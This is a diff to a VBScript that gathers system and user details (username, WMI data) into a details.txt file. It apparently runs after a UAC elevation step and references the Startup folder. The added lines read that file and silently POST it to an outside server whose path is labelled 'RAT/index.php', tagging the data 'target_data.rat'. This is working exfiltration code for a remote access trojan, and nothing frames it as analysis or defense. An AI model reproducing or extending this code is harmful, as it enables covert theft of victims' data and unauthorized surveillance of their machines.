@@ -117,7 +117,6 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     'WScript.Echo "Finished."
 
-    
     Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
     Set objWScriptShell = CreateObject("WScript.Shell")
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
@@ -132,10 +131,20 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
     Set oShell = CreateObject("Shell.Application")
     Set startupFolder = oShell.NameSpace(ssfSTARTUP)
     If Not startupFolder Is Nothing Then
-    startupFolderPath = startupFolder.Self.Path
+        startupFolderPath = startupFolder.Self.Path
     End If
 
     strUsername = objWScriptShell.ExpandEnvironmentStrings("%USERNAME%")
+
+    ' Function to read the file content
+    Function ReadFile(filePath)
+        Dim fso, file, content
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set file = fso.OpenTextFile(filePath, 1)
+        content = file.ReadAll
+        file.Close
+        ReadFile = content
+    End Function
 
     ' Create and open the text file in the same directory as the script
     Set objFile = objFSO.CreateTextFile(strFolderPath & "\details.txt", True)
@@ -176,5 +185,30 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
     Next
 
     objFile.Close
+
+    ' Upload the details.txt file
+    Dim filePath, url, xmlhttp, formData
+    filePath = strFolderPath & "\details.txt"
+    url = "https://arth.imbeddex.com/RAT/index.php"
+
+    ' Create XMLHTTP object
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+    ' Open the connection
+    xmlhttp.Open "POST", url, False
+
+    ' Create form data
+    formData = "target_data.rat" & vbCrLf
+    formData = formData & ReadFile(filePath) & vbCrLf
+
+    ' Send the request
+    xmlhttp.send formData
+
+    ' Check the response
+    If xmlhttp.Status = 200 Then
+        'MsgBox "File uploaded successfully!"
+    Else
+        'MsgBox "Error uploading file: " & xmlhttp.Status & " - " & xmlhttp.statusText
+    End If
 
 End If
